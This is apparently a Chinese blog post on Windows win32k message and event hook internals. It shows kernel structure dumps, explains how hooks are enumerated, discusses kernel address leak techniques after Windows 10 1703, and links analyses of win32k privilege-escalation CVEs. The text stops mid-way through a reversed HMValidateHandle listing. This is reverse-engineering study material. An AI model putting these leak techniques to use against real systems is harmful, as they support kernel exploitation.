<p>局部钩子代码示例：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38409301/article/details/121599765?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-121599765-blog-120734243.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-121599765-blog-120734243.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=2">windows hook(钩子)–进程钩子</a>。</p>
<h4 id="钩子链表"><a href="#钩子链表" class="headerlink" title="钩子链表"></a>钩子链表</h4><p>将钩住不同消息的钩子回调函数存储在不同的链表中（根据钩子类型 <code>idHook</code> 共15个链表），默认的钩子安装到链表的方式是“队列式”，<strong>后安装的钩子回调函数总是在链表最前面</strong>。</p>
<p>实际上桌面堆中有 16 个钩子类型空间。桌面堆信息 <code>tagDESKTOPINFO记录了这一事实：</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt tagDESKTOPINFO</span><br><span class="line">win32k!tagDESKTOPINFO</span><br><span class="line">...</span><br><span class="line">  +<span class="number">0x020</span> aphkStart : [<span class="number">16</span>] Ptr64 tagHOOK</span><br></pre></td></tr></table></figure>



<h4 id="消息钩子结构tagHOOK"><a href="#消息钩子结构tagHOOK" class="headerlink" title="消息钩子结构tagHOOK"></a>消息钩子结构tagHOOK</h4><p>消息钩子结构为 <code>win32k!tagHOOK</code>：（Windows7 SP1 x64）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt tagHOOK</span><br><span class="line">win32k!tagHOOK</span><br><span class="line">   +<span class="number">0x000</span> head             : _THRDESKHEAD</span><br><span class="line">   +<span class="number">0x028</span> phkNext          : Ptr64 tagHOOK</span><br><span class="line">   +<span class="number">0x030</span> iHook            : Int4B</span><br><span class="line">   +<span class="number">0x038</span> offPfn           : Uint8B</span><br><span class="line">   +<span class="number">0x040</span> flags            : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> ihmod            : Int4B</span><br><span class="line">   +<span class="number">0x048</span> ptiHooked        : Ptr64 tagTHREADINFO</span><br><span class="line">   +<span class="number">0x050</span> rpdesk           : Ptr64 tagDESKTOP</span><br><span class="line">   +<span class="number">0x058</span> nTimeout         : Pos <span class="number">0</span>, <span class="number">7</span> Bits</span><br><span class="line">   +<span class="number">0x058</span> fLastHookHung    : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>偏移</th>
<th>成员</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>+0x000</td>
<td>head</td>
<td>GUI 用户对象公共头结构，此处为 <code>_THRDESKHEAD</code>，表示桌面堆头结构，且钩子相关信息在桌面堆信息 <code>tagDESKTOPINFO</code> 结构中有所体现。<mark class="label success">钩子结构是和桌面相关的</mark></td>
</tr>
<tr>
<td>+0x028</td>
<td>phkNext</td>
<td>指向同一个类型钩子链中下一个钩子的指针。 当挂钩过程调用 <code>CallNextHookEx</code> 时，系统会使用该成员定位下一个挂钩。</td>
</tr>
<tr>
<td>+0x030</td>
<td>iHook</td>
<td>函数 <code>SetWindowsHookEx</code> 的参数一指定的钩子类型。</td>
</tr>
<tr>
<td>+0x038</td>
<td>offPfn</td>
<td>挂钩过程的相对虚拟地址（RVA）。 局部钩子：与调用 <code>SetwindowsHookEx</code> 的代码位于同一模块中，则为模块基址的偏移，在这种情况下成员 <code>ihmod = -1</code>。 全局挂钩，钩子函数位于 DLL 中，<code>offPfn</code> 是相对于该 DLL 加载基地的偏移量。而 <code>ihmod</code> 是 <code>win32k!aatomsysLoaded</code> 原子数组的索引（该DLL路径在原子表中）。 要确定 DLL 的名称，您必须将 <code>ihmod</code> 转换为原子，然后获取原子名称。</td>
</tr>
<tr>
<td>+0x048</td>
<td>ptiHooked</td>
<td>这个值可以用来标识被钩住的线程。</td>
</tr>
<tr>
<td>+0x050</td>
<td>rpdesk</td>
<td>钩子所属的桌面。 钩子 Hooks 不能跨越桌面边界。</td>
</tr>
</tbody></table>
<p>关于 <code>tagHOOK.ihmod</code>：</p>
<p>关于全局钩子，进程加载的包含钩子的 DLL全路径，会放到全局原子表中（全局原子表的位置 <code>win32k!UserAtomHandleTable</code>）。<br><code>win32k!aatomsysLoaded</code> 是一个数组，该数组为 <code>ATOM</code> 类型，使用该数组存的原子值可以对应检索到 DLL 的名称（全路径），而此时的 <code>tagHOOK.ihmod</code> 即为该数组的索引：<code>aatomsysLoaded[tagHOOK.ihmod]</code> 即可找到该 DLL 的全路径。参考《<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261767.htm">高版本64位Win10（RS2或更高）下枚举消息钩子的一种思路</a>》，还有一篇介绍钩子的文章值得一读《<a target="_blank" rel="noopener" href="http://blog.airesoft.co.uk/2011/07/hookers-underneath-the-sheets/">Hookers – Underneath the Sheets</a>》。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATOM aatomsysLoaded[MAXOfBuckets];</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/10/13/FL2PBhNEVqMg5KC.png" alt="30.png"></p>
<h4 id="枚举所有消息挂钩"><a href="#枚举所有消息挂钩" class="headerlink" title="枚举所有消息挂钩"></a>枚举所有消息挂钩</h4><p>方法一：需要使用到 <code>tagDESKTOP</code> 结构，或者如果已知某个钩子 <code>tagHOOK</code> 结构的地址，<code>tagHOOK.head</code>（<code>tagTHREADINFO</code>）也可以枚举当前桌面中所有的已安装的钩子。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//桌面堆头结构</span></span><br><span class="line">kd&gt; dt _THRDESKHEAD</span><br><span class="line">win32k!_THRDESKHEAD</span><br><span class="line">   +<span class="number">0x000</span> h                : Ptr64 Void</span><br><span class="line">   +<span class="number">0x008</span> cLockObj         : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> pti              : Ptr64 tagTHREADINFO</span><br><span class="line">   +<span class="number">0x018</span> rpdesk           : Ptr64 tagDESKTOP</span><br><span class="line">   +<span class="number">0x020</span> pSelf            : Ptr64 UChar</span><br><span class="line"></span><br><span class="line">kd&gt; dt tagDESKTOPINFO</span><br><span class="line">win32k!tagDESKTOPINFO</span><br><span class="line">   +<span class="number">0x000</span> pvDesktopBase    : Ptr64 Void</span><br><span class="line">   +<span class="number">0x008</span> pvDesktopLimit   : Ptr64 Void</span><br><span class="line">   +<span class="number">0x010</span> spwnd            : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x018</span> fsHooks          : Uint4B</span><br><span class="line">   +<span class="number">0x020</span> aphkStart        : [<span class="number">16</span>] Ptr64 tagHOOK</span><br><span class="line">   +<span class="number">0x0a0</span> spwndShell       : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0a8</span> ppiShellProcess  : Ptr64 tagPROCESSINFO</span><br><span class="line">   +<span class="number">0x0b0</span> spwndBkGnd       : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0b8</span> spwndTaskman     : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0c0</span> spwndProgman     : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0c8</span> pvwplShellHook   : Ptr64 VWPL</span><br><span class="line">   +<span class="number">0x0d0</span> cntMBox          : Int4B</span><br><span class="line">   +<span class="number">0x0d8</span> spwndGestureEngine : Ptr64 tagWND</span><br><span class="line">   +<span class="number">0x0e0</span> pvwplMessagePPHandler : Ptr64 VWPL</span><br><span class="line">   +<span class="number">0x0e8</span> fComposited      : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x0e8</span> fIsDwmDesktop    : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure>

<p>桌面堆信息存储在 <code>tagDESKTOPINFO</code> 结构中。该结构可以在内核空间 <code>win32k!tagCLIENTINFO.pDeskInfo</code> ，或用户空间 <code>Teb.Win32ClientInfo.pDesklnfo</code> 中找到， 则 <code>Teb.Win32ClientInfo</code> 是 <code>tagCLIENTINFO</code> 结构。</p>
<p>方法二：见本文第二章—GUI-Windows 10以后的变化。</p>
<h3 id="1-2-事件钩子"><a href="#1-2-事件钩子" class="headerlink" title="1.2 事件钩子"></a>1.2 事件钩子</h3><p>有些 Windows 事件并没有消息对应，譬如弹出菜单，切换窗口，获得焦点，滚动条滚动等等，要截获这些事件可以使用<code>SetWinEventHook</code> 函数。关于消息钩子和事件钩子的不同，可以看《<a target="_blank" rel="noopener" href="http://www.cppblog.com/weiym/archive/2013/10/30/203991.html">HOOK技术的一些简单总结</a>》、《<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269522.htm#msg_header_h2_4">HOOK技术 学习总结</a>》。</p>
<p>类似消息钩子，当桌面上某个事件&#x2F;动产产生时，我们也可以安装监控该事件的钩子。称为事件钩子（Event Hook）。</p>
<blockquote>
<p>当某些与 Ul 相关的事件发生时，应用程序可以使用事件钩子来接收通知。 例如：</p>
<ol>
<li>Windows 资源管理器在播放声音时触发事件 (EVENT_SYSTEM _SOUND)。</li>
<li>当滚动操作开始时（EVENT_SYSTEM_SCROLLSTART）</li>
<li>当菜单栏中的某个项目（例如“开始”菜单）被选中时 (EVENT_SYSTEM _ MENUSTART)。</li>
<li>如果客户端应用程序想要在发出声音时在系统托盘中显示一个小扬声器图标，他们可以通过安装一个监听 EVENT_SYSTEM_SOUND 的事件钩子来同步行为。</li>
</ol>
</blockquote>
<p>事件钩子的结构为 <code>tagEVENTHOOK</code>，但是微软没有该结构的符号，以下罗列 Windows 7 x64（Windows 10 1703前的结构可参考<a target="_blank" rel="noopener" href="https://www.essentialobjects.com/forum/postsm51964_eowpexe-calls-SetWinEventHook-event.aspx">win32kbase!tagEVENTHOOK</a>）：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dt(<span class="string">&quot;tagEVENTHOOK&quot;</span>)</span><br><span class="line">&#x27;tagEVENTHOOK&#x27; (None bytes)</span><br><span class="line"><span class="number">0x00</span>  : head                           [_THROBJHEAD]</span><br><span class="line">0x18  : phkNext                        [&#x27;pointer&#x27;, [&#x27;tagEVENTHOOK&#x27;]]</span><br><span class="line">0x20  : eventMin                       [&#x27;Enumeration&#x27;, &#123;&#x27;target&#x27;: &#x27;unsigned long&#x27;, </span><br><span class="line">                                                        &#x27;choices&#x27;: &#123;1: &#x27;EVENT_MIN&#x27;, 2: &#x27;EVENT_SYSTEM_ALERT&#x27;, [snip]</span><br><span class="line">0x24  : eventMax                       [&#x27;Enumeration&#x27;, &#123;&#x27;target&#x27;: &#x27;unsigned long&#x27;, </span><br><span class="line">                                                        &#x27;choices&#x27;: &#123;1: &#x27;EVENT_MIN&#x27;, 2: &#x27;EVENT_SYSTEM_ALERT&#x27;, [snip]</span><br><span class="line">0x28  : dwFlags                        [&#x27;unsigned long&#x27;]</span><br><span class="line">0x2c  : idProcess                      [&#x27;unsigned long&#x27;]</span><br><span class="line">0x30  : idThread                       [&#x27;unsigned long&#x27;]</span><br><span class="line">0x40  : offPfn                         [&#x27;unsigned long long&#x27;]</span><br><span class="line">0x48  : ihmod                          [&#x27;long&#x27;]</span><br></pre></td></tr></table></figure>

<p>以上的成员大部分和事件钩子安装函数 <code>SetWinEventHook</code> 的<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwineventhook">参数</a>相同。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HWINEVENTHOOK <span class="title">SetWinEventHook</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        eventMin,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        eventMax,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HMODULE      hmodWinEventProc,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] WINEVENTPROC pfnWinEventProc,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        idProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        idThread,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD        dwFlags</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><code>tagEVENTHOOK</code> 结构成员解析：</p>
<table>
<thead>
<tr>
<th>成员</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>head</td>
<td>对象头，<code>_THROBJHEAD</code> 结构。</td>
</tr>
<tr>
<td>phkNext</td>
<td>指向钩子链表中的下一个钩子。</td>
</tr>
<tr>
<td>eventMin&#x2F;eventMax</td>
<td>表示截获哪个范围类的事件。微软给每个事件定义了一个<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/winauto/event-constants?redirectedfrom=MSDN">编号</a>，这些事件都是以 <code>EVENT_</code> 开头（消息以<code>WM_</code>开头）。有两个宏分别表示最小的事件ID和最大的事件ID（<code>EVENT_MIN</code> 和 <code>EVENT_MAX</code>），分别传这两个参数给<em>eventMin和eventMax</em>则可以截获所有的事件。</td>
</tr>
<tr>
<td>dwFlags</td>
<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwineventhook">该标志用来说明</a>，包含钩子的 DLL 是否已经加载到目标进程的地址空间。</td>
</tr>
<tr>
<td>idProcess</td>
<td>钩子函数接收哪个进程 PID 的事件，如果为 <code>0</code> 则接收当前桌面上所有进程的事件。</td>
</tr>
<tr>
<td>idThread</td>
<td>钩子函数接收哪个线程 TID 的事件，如果为 <code>0</code> 则接收当前桌面上所有线程的事件。</td>
</tr>
<tr>
<td>offPfn</td>
<td>偏移值（RVA），钩子函数相对于注入 DLL 基地址的偏移。</td>
</tr>
<tr>
<td>ihmod</td>
<td><code>win32k!aatomsysLoaded</code> 数组的索引，可用于标识包含挂钩过程的 DLL 的完整路径。</td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nc-winuser-wineventproc?redirectedfrom=MSDN">钩子函数</a>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">( CALLBACK *WINEVENTPROC)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">   HWINEVENTHOOK hWinEventHook,</span></span></span><br><span class="line"><span class="function"><span class="params">   DWORD         event,</span></span></span><br><span class="line"><span class="function"><span class="params">   HWND          hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">   LONG          idObject,</span></span></span><br><span class="line"><span class="function"><span class="params">   LONG          idChild,</span></span></span><br><span class="line"><span class="function"><span class="params">   DWORD         dwEventThread,</span></span></span><br><span class="line"><span class="function"><span class="params">   DWORD         dwmsEventTime</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwinevent">钩子卸载</a>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookWinEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HWINEVENTHOOK hWinEventHook</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-notifywinevent">生成事件</a>的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NotifyWinEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] DWORD event,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HWND  hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] LONG  idObject,</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] LONG  idChild</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="2-GUI-Windows-10以后的变化"><a href="#2-GUI-Windows-10以后的变化" class="headerlink" title="2 GUI-Windows 10以后的变化"></a>2 GUI-Windows 10以后的变化</h2><p><strong>Windows 10 1703——取消对象头 phead</strong></p>
<p>该版本以前，可以使用 <code>user32!gSharedInfo.aheList</code>（<code>_HANDLEENTRY</code>）得到句柄表，然后使用 <code>HANDLEENTRY.phead.Hanle</code> 得到用户对象句柄，调用 <code>PVOID HMValidateHandle(HANDLE Handle, HANDLE_TYPE hType)</code> 得到该对象的地址。（此处的 <code>HANDLE</code> 不是 <code>ntoskrnl</code> 中的句柄）</p>
<p>但是，从 <strong>Windows 10 1703</strong> 开始，<mark class="label danger">微软取消了phead指针</mark>，堵死了泄漏。</p>
<p>但是，仍然可以从用户模式的<strong>桌面堆</strong>或 <code>TEB.Win32ClientInfo</code> 来泄露窗口对象——《<a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials/expDev/22.html">Part 18: Kernel Exploitation -&gt; RS2 Bitmap Necromancy</a>》。</p>
<p>GUI 漏洞聚焦于：<strong>内核数据泄漏</strong>。</p>
<p>两篇写的非常好的文章一定要拜读：</p>
<ol>
<li>《<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241804#h3-12">CVE-2021-1732 Windows10 本地提权漏洞复现及详细分析</a>》</li>
<li>《<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/272305">CVE-2022-21882 Win32k内核提权漏洞深入分析</a>》</li>
</ol>
<p>CVE-2022-21882是对CVE-2021-1732漏洞的绕过，属于win32k驱动程序中的一个类型混淆漏洞。</p>
<p><strong>CVE-2021-1732</strong>：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241804#h3-12">CVE-2021-1732 Windows10 本地提权漏洞复现及详细分析</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-274015.htm">CVE-2021-1732提权漏洞学习笔记</a></li>
<li><a target="_blank" rel="noopener" href="https://www.real-sec.com/2022/01/technical-analysis-of-cve-2021-1732/">Technical Analysis of CVE-2021-1732</a>——翻译版本<a target="_blank" rel="noopener" href="https://nosec.org/home/detail/4940.html">深入分析CVE-2021-1732漏洞</a></li>
<li><a target="_blank" rel="noopener" href="https://iamelli0t.github.io/2021/03/25/CVE-2021-1732.html">CVE-2021-1732: win32kfull xxxCreateWindowEx callback out-of-bounds</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261767.htm">高版本64位Win10（RS2或更高）下枚举消息钩子的一种思路</a></li>
</ul>
<p><strong>CVE-2022-21882</strong>：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/272305">CVE-2022-21882 Win32k内核提权漏洞深入分析</a></li>
<li><a target="_blank" rel="noopener" href="https://www.avira.com/en/blog/anatomy-of-an-exploit-in-windows-win32k-cve-2022-21882">Anatomy of an exploit in Windows win32k – CVE-2022-21882</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261767.htm">高版本64位Win10（RS2或更高）下枚举消息钩子的一种思路</a></li>
</ul>
<p>CVE-2018-8453：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-5.html">从补丁diff到EXP–CVE-2018-8453漏洞分析与利用</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-249021.htm">cve-2018-8453分析及利用EXP编写</a></li>
</ul>
<p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p>文章 <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261767.htm">高版本64位Win10（RS2或更高）下枚举消息钩子的一种思路</a> 给出了Windows 10 函数多种新的变化，还有 <code>win32kbase!HMValidateHandle</code> 函数。另一种方法是<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-251220.htm">Win10 tagWnd &amp; 内核枚举窗口</a>。在 3 环获取方式参看<a target="_blank" rel="noopener" href="https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp">这里</a>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">HANDLE_TYPE</span> &#123;</span></span><br><span class="line">       TYPE_FREE = <span class="number">0</span>,</span><br><span class="line">       TYPE_WINDOW = <span class="number">1</span>,</span><br><span class="line">       TYPE_MENU = <span class="number">2</span>,</span><br><span class="line">       TYPE_CURSOR = <span class="number">3</span>,</span><br><span class="line">       TYPE_SETWINDOWPOS = <span class="number">4</span>,</span><br><span class="line">       TYPE_HOOK = <span class="number">5</span>,</span><br><span class="line">       TYPE_CLIPDATA = <span class="number">6</span>,</span><br><span class="line">       TYPE_CALLPROC = <span class="number">7</span>,</span><br><span class="line">       TYPE_ACCELTABLE = <span class="number">8</span>,</span><br><span class="line">       TYPE_DDEACCESS = <span class="number">9</span>,</span><br><span class="line">       TYPE_DDECONV = <span class="number">10</span>,</span><br><span class="line">       TYPE_DDEXACT = <span class="number">11</span>,</span><br><span class="line">       TYPE_MONITOR = <span class="number">12</span>,</span><br><span class="line">       TYPE_KBDLAYOUT = <span class="number">13</span>,</span><br><span class="line">       TYPE_KBDFILE = <span class="number">14</span>,</span><br><span class="line">       TYPE_WINEVENTHOOK = <span class="number">15</span>,</span><br><span class="line">       TYPE_TIMER = <span class="number">16</span>,</span><br><span class="line">       TYPE_INPUTCONTEXT = <span class="number">17</span>,</span><br><span class="line">       TYPE_HIDDATA = <span class="number">18</span>,</span><br><span class="line">       TYPE_DEVICEINFO = <span class="number">19</span>,</span><br><span class="line">       TYPE_TOUCHINPUT = <span class="number">20</span>,</span><br><span class="line">       TYPE_GESTUREINFO = <span class="number">21</span>,</span><br><span class="line">       TYPE_CTYPES = <span class="number">22</span>,</span><br><span class="line">       TYPE_GENERIC = <span class="number">255</span></span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="function">PVOID <span class="title">HMValidateHandle</span><span class="params">(HANDLE Handle, HANDLE_TYPE hType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       PVOID Object = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span> ((USHORT)Handle &lt; gSharedInfo-&gt;psi-&gt;cHandleEntries)</span><br><span class="line">       &#123;</span><br><span class="line">              PHANDLEENTRY hEntry = &amp;gSharedInfo-&gt;aheList[(USHORT)Handle];</span><br><span class="line">              PVOID *pObject = &amp;gpKernelHandleTable[<span class="number">2</span> * (USHORT)Handle];</span><br><span class="line">              USHORT Handle_HIWORD = (USHORT)(Handle &gt;&gt; <span class="number">0x10</span>);</span><br><span class="line">              <span class="keyword">if</span> ((Handle_HIWORD == hEntry-&gt;wUniq || Handle_HIWORD == <span class="number">-1</span> || !Handle_HIWORD &amp;&amp; PsGetCurrentProcessWow64Process())</span><br><span class="line">                     &amp;&amp; !(hEntry-&gt;bFlags &amp; <span class="number">1</span>)</span><br><span class="line">                     &amp;&amp; hEntry-&gt;bType == hType )</span><br><span class="line">              &#123;</span><br><span class="line">                     Object = *pObject;</span><br><span class="line">              &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (W32GetThreadWin32Thread(PsGetCurrentThread())-&gt;TIF_flags &amp; <span class="number">0x20000000</span>)</span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">if</span> (!ValidateHandleSecure(Handle, <span class="number">3</span>)) Object = <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">              <span class="keyword">if</span> (!ValidateHandleSecure(Handle, <span class="number">2</span>)) Object = <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (!Object)</span><br><span class="line">       &#123;</span><br><span class="line">              DWORD dwErrorCode;</span><br><span class="line">              <span class="keyword">switch</span> (hType)</span><br><span class="line">              &#123;</span><br><span class="line">              <span class="keyword">case</span> TYPE_WINDOW:</span><br><span class="line">                     dwErrorCode = <span class="number">1400</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> TYPE_MENU:</span><br><span class="line">                     dwErrorCode = <span class="number">1401</span>;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> 